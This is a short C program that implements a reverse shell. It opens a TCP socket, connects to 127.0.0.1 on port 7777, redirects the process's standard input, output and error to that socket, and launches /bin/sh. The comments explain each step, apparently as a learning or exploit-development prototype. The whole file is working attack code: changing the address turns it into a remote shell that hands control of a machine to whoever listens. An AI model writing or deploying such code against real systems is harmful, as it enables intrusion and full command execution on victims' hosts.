#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define ADDR "127.0.0.1"
#define PORT 7777

int main(void) {

    // Create socket for outgoing connection
    int conn_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // Forward process's stdin, stdout and stderr to the incoming connection
    dup2(conn_sock,0);
    dup2(conn_sock,1);
    dup2(conn_sock,2);


    // Populate server side connection information
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET; // IPv4
    serv_addr.sin_addr.s_addr = inet_addr(ADDR); // IP address: localhost
    serv_addr.sin_port = htons(PORT);  // Port #

    // Initiate connection
    connect(conn_sock, (struct sockaddr *) &serv_addr, 16);


    // Run shell
    execve("/bin/sh", NULL, NULL);
}
